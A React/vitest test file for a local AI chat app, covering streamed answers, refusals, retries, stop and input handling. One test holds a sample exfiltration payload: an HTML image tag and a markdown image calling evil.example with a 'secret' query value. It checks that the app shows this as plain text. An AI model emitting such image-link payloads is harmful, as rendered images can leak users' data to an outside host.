import type { ChatClient } from '@local-ai/client';
import { ChatClientError } from '@local-ai/client';
import type { ChatRequestBody, SseEvent } from '@local-ai/contract';
import { fixtureTurns } from '@local-ai/contract/fixtures';
import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { describe, expect, it } from 'vitest';

import { toBlocks } from './Answer.js';
import { App } from './App.js';

interface FakeClient extends ChatClient {
  readonly bodies: ChatRequestBody[];
}

function fakeClient(
  script: (n: number, signal: AbortSignal) => AsyncIterable<SseEvent>,
): FakeClient {
  const bodies: ChatRequestBody[] = [];
  return {
    bodies,
    send(body, signal) {
      bodies.push(body);
      return script(bodies.length, signal);
    },
  };
}

async function* events(list: readonly SseEvent[]): AsyncIterable<SseEvent> {
  for (const e of list) {
    await Promise.resolve();
    yield e;
  }
}

async function ask(text: string): Promise<void> {
  await userEvent.type(screen.getByLabelText('Message'), text);
  await userEvent.click(screen.getByRole('button', { name: 'Send' }));
}

describe('web app', () => {
  it('shows the question and the streamed answer, with code as a code block', async () => {
    render(<App client={fakeClient(() => events(fixtureTurns.answered ?? []))} />);
    await ask('Hello');
    expect(screen.getByLabelText('You')).toHaveTextContent('Hello');
    await waitFor(() => {
      expect(screen.getByText(/First paragraph, with "quotes"/)).toBeInTheDocument();
    });
    expect(screen.getByText(/const a = 1;/).tagName).toBe('CODE');
    expect(screen.queryByText('Writing…')).not.toBeInTheDocument();
  });

  it('sends the conversation id from the first turn with the next one', async () => {
    const client = fakeClient(() => events(fixtureTurns.answered ?? []));
    render(<App client={client} />);
    await ask('One');
    await waitFor(() => expect(screen.getByRole('button', { name: 'Send' })).toBeDisabled());
    await ask('Two');
    await waitFor(() => {
      expect(client.bodies).toHaveLength(2);
    });
    expect(client.bodies[0]).toEqual({ message: 'One' });
    expect(client.bodies[1]).toEqual({
      message: 'Two',
      conversationId: '7c9e6679-7425-40de-944b-e07fc1f90ae7',
    });
  });

  it('shows a refusal as a note, keeping text released before it', async () => {
    render(<App client={fakeClient(() => events(fixtureTurns.refusedMidAnswer ?? []))} />);
    await ask('Hello');
    expect(await screen.findByRole('note')).toHaveTextContent("I can't help with that.");
    expect(screen.getByText('Released before the flag.')).toBeInTheDocument();
  });

  it('shows a delivery failure with a retry button that sends the question again', async () => {
    const client = fakeClient((n) =>
      n === 1
        ? (async function* () {
            await Promise.resolve();
            yield* [];
            throw new ChatClientError('network', "I can't reach the assistant.", true);
          })()
        : events(fixtureTurns.answered ?? []),
    );
    render(<App client={client} />);
    await ask('Hello');
    const alert = await screen.findByRole('alert');
    expect(alert).toHaveTextContent("I can't reach the assistant.");
    await userEvent.click(within(alert).getByRole('button', { name: 'Try again' }));
    await waitFor(() => {
      expect(client.bodies).toHaveLength(2);
    });
    expect(client.bodies[1]?.message).toBe('Hello');
  });

  it('stops a turn and marks it stopped', async () => {
    const client = fakeClient((_n, signal) =>
      (async function* () {
        yield { type: 'status', phase: 'answering' } satisfies SseEvent;
        await new Promise((_r, reject) => {
          signal.addEventListener('abort', () => {
            reject(new DOMException('aborted', 'AbortError'));
          });
        });
      })(),
    );
    render(<App client={client} />);
    await ask('Hello');
    await userEvent.click(await screen.findByRole('button', { name: 'Stop' }));
    expect(await screen.findByText('Stopped.')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'Send' })).toBeInTheDocument();
  });

  it('sends on Enter and adds a line on Shift+Enter, ignoring blank input', async () => {
    const client = fakeClient(() => events(fixtureTurns.refused ?? []));
    render(<App client={client} />);
    const box = screen.getByLabelText('Message');
    await userEvent.type(box, '   {Enter}');
    expect(client.bodies).toHaveLength(0);
    await userEvent.type(box, 'line one{Shift>}{Enter}{/Shift}line two{Enter}');
    await waitFor(() => {
      expect(client.bodies).toHaveLength(1);
    });
    expect(client.bodies[0]?.message).toBe('line one\nline two');
  });

  it('renders model text as plain text, never as HTML or images', async () => {
    const hostile: SseEvent[] = [
      { type: 'status', phase: 'answering' },
      {
        type: 'delta',
        text: '<img src="https://evil.example/x?d=secret"> ![x](https://evil.example/y)',
      },
      { type: 'done', finishReason: 'stop' },
    ];
    const { container } = render(<App client={fakeClient(() => events(hostile))} />);
    await ask('Hello');
    await screen.findByText(/evil\.example\/x/);
    expect(container.querySelector('img')).toBeNull();
    expect(container.querySelector('a')).toBeNull();
  });
});

describe('answer blocks', () => {
  it('splits paragraphs and fenced code, including tilde fences and an unclosed block', () => {
    expect(toBlocks('One\n\nTwo\n~~~\ncode\n~~~\nAfter\n```\nopen')).toEqual([
      { kind: 'text', content: 'One' },
      { kind: 'text', content: 'Two' },
      { kind: 'code', content: 'code' },
      { kind: 'text', content: 'After' },
      { kind: 'code', content: 'open' },
    ]);
  });
});
